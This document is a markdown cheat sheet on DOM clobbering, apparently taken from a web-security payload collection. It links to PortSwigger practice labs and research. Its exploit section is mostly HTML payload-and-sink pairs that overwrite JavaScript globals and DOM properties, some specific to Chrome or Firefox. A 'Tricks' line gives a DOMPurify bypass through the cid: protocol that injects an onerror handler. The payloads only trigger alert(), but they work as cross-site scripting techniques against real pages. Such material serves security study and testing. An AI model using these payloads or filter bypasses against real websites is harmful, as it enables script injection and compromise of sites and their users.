# Dom Clobbering

> DOM Clobbering is a technique where global variables can be overwritten or "clobbered" by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.

## Summary

* [Lab](#lab)
* [Exploit](#exploit)
* [References](#references)


## Lab

* [Lab: Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
* [Lab: Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
* [Lab: DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## Exploit

Exploitation requires any kind of `HTML injection` in the page.

* Clobbering `x.y.value`
    ```html
    // Payload
    <form id=x><output id=y>I've been clobbered</output>

    // Sink
    <script>alert(x.y.value);</script>
    ```

* Clobbering `x.y` using ID and name attributes together to form a DOM collection
    ```html
    // Payload
    <a id=x><a id=x name=y href="Clobbered">

    // Sink
    <script>alert(x.y)</script>
    ```

* Clobbering `x.y.z` - 3 levels deep
    ```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // Sink
    <script>alert(x.y.z)</script>
    ```

* Clobbering `a.b.c.d` - more than 3 levels
    ```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // Sink
    <script>alert(a.b.c.d)</script>
    ```

* Clobbering `forEach` (Chrome only)
    ```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // Sink
    <script>x.y.forEach(element=>alert(element))</script>
    ```

* Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute
    ```html
    // Payloads
    <html id="cdnDomain">clobbered</html>
    <svg><body id=cdnDomain>clobbered</body></svg>


    // Sink 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//clobbbered
    </script>
    ```

* Clobbering `x.username`
    ```html
    // Payload
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

    // Sink
    <script>
    alert(x.username)//Clobbered-username
    alert(x.password)//Clobbered-password
    </script>
    ```

* Clobbering (Firefox only)
    ```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">

    // Sink
    <script>
    alert(x)//Firefox<>
    </script>
    ```

* Clobbering (Chrome only)
    ```html
    // Payload
    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
    ```


## Tricks

* DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`


## References

* [Dom Clobbering - PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering)
* [Dom Clobbering - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
* [DOM Clobbering strikes back - @garethheyes - 06 February 2020](https://portswigger.net/research/dom-clobbering-strikes-back)
* [Hijacking service workers via DOM Clobbering - @garethheyes - 29 November 2022](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [Bypassing CSP via DOM clobbering - @garethheyes - 05 June 2023](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)